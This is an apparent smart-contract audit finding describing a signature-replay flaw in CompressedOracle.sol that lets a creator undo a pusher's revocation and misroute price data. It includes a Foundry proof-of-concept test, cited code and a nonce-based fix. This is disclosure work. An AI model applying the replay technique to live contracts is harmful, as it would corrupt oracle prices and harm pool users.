### Title
Creator replays a pusher's consent signature within the deadline window to re-establish delegation after `revokePusher()`, bypassing the pusher's revocation — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` uses a deadline to prevent replay of consent signatures after the deadline expires. However, there is no nonce or used-signature tracking to prevent replay **within** the deadline window. A creator who holds a pusher's valid consent signature can replay it after the pusher calls `revokePusher()`, silently re-establishing delegation and routing the pusher's subsequent pushes into the creator's namespace against the pusher's will, potentially feeding wrong prices into pools.

---

### Finding Description

`allowPushers` signs consent as:

```
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
```

The code comment explicitly acknowledges the risk:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it." [1](#0-0) 

The deadline prevents replay **after** it expires. But there is **no nonce, no used-signature set, and no check** that prevents the creator from replaying the same valid signature **before** the deadline. The comment's claim that the deadline solves the problem is incorrect — it only narrows the replay window, it does not close it.

After a pusher calls `revokePusher()`, which sets `namespaceRemapping[pusher] = address(0)`: [2](#0-1) 

The creator can immediately call `allowPushers` again with the **same signature** (deadline still in the future) and `namespaceRemapping[pusher]` is set back to `creator`. The revocation is silently undone.

The `fallback` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [3](#0-2) 

So every push the pusher makes after revocation — believing it goes to their own namespace — is silently routed into the creator's namespace instead.

This is the direct analog to the GoGoPool M-12 bug: just as `rewardsStartTime` was only set when zero (allowing the moratorium to be bypassed on minipool recreation), here the `namespaceRemapping` state is reset by `revokePusher` but can be immediately restored by the creator replaying the same signature, bypassing the pusher's revocation protection.

---

### Impact Explanation

After revocation, the pusher believes their pushes land in their own namespace. The creator replays the signature and the pusher's data — which may be for a different asset pair, different price scale, or different semantics intended for the pusher's own feeds — is written into the creator's namespace slots. Any pool consuming the creator's feeds via `price(feedId, pool)` receives this misdirected data as a live bid/ask quote. This is a bad-price execution path: the pusher's data (not intended for the creator's pools) drives swap pricing.

---

### Likelihood Explanation

The creator already holds the pusher's consent signature — they used it to establish the original delegation. Re-establishing delegation requires only calling `allowPushers` again with the same bytes. No additional resources, permissions, or off-chain coordination are needed. The attack is executable in a single transaction by any creator who has a pusher's consent signature and whose deadline has not yet expired. Consent signatures are typically issued with multi-day or multi-week deadlines (the test suite uses `block.timestamp + 1 days`), giving a wide replay window. [4](#0-3) 

---

### Recommendation

Add a per-pusher nonce included in the signed message and incremented on each successful `allowPushers` call:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender, pusherNonce[pusher]))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
pusherNonce[pusher]++;
namespaceRemapping[pusher] = msg.sender;
```

After `revokePusher()` increments (or invalidates) the nonce, the old signature is permanently invalid. Alternatively, mark each signature hash as consumed in a `mapping(bytes32 => bool) public usedSignatures` set.

---

### Proof of Concept

```solidity
function testRevokeBypassViaSignatureReplay() public {
    uint256 deadline = block.timestamp + 30 days;

    // Pusher signs consent once
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // Step 1: Creator establishes delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator, "delegation established");

    // Step 2: Pusher revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0), "revocation successful");

    // Step 3: Creator replays the SAME signature — succeeds, deadline still valid
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs); // no revert
    assertEq(oracle.namespaceRemapping(pusher), creator, "revocation bypassed!");

    // Step 4: Pusher pushes data believing it goes to their own namespace
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 wrongPrice = _packRaw(PUSHER_OWN_PRICE, 5, 0);
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(2, 3, wrongPrice, tsMs));
    assertTrue(ok);

    // Data lands in creator's namespace — creator's pools consume wrong price
    assertEq(
        oracle.getOracleData(oracle.feedIdOf(creator, 2, 3)).price,
        U64x32.decode(uint32(wrongPrice >> 16)),
        "wrong price in creator namespace"
    );
    // Pusher's own namespace is empty — pusher had no idea
    assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 2, 3)).price, 0);
}
``` [5](#0-4) [2](#0-1) [6](#0-5)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-212)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L311-344)
```text
    fallback() override external {
        uint256 end;
        uint256 namespace;

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }

        // 4 * 6 + 7 + 1 = 32 bytes per slot
        if (end == 0 || end % 32 != 0) revert BadCalldataLength();

        for (uint256 ptr = 0; ptr < end; ptr += 32) {
            uint256 word;
            assembly ("memory-safe") {
                word := calldataload(ptr)
            }
            // casting to 'uint8' is safe we want LSB
            // forge-lint: disable-next-line(unsafe-typecast)
            uint8 slotId = uint8(word);
            TimeMs timestampMs = toTimeMs(word >> 8 & X56);
            timestampMs.revertIfAfterBlockTimeWithDrift(MAX_TIME_DRIFT);
            bytes32 key = bytes32(namespace | uint256(slotId));
            uint256 old = uint256(_loadStorage(key));
            TimeMs oldTimestampMs = toTimeMs(old >> 8 & X56);

            bool newer = timestampMs.isAfter(oldTimestampMs);
            if (!newer) continue;

            _writeStorage(key, bytes32(bytes32(word & ~uint256(0xff))));
        }
```

**File:** smart-contracts-poc/test/oracles/compressed/CompressedOracle.t.sol (L339-342)
```text
    function testAllowPushersDelegatesNamespace() public {
        uint256 deadline = block.timestamp + 1 days;
        _allowPusher(deadline);
        assertEq(oracle.namespaceRemapping(pusher), creator, "pusher should map to creator");
```
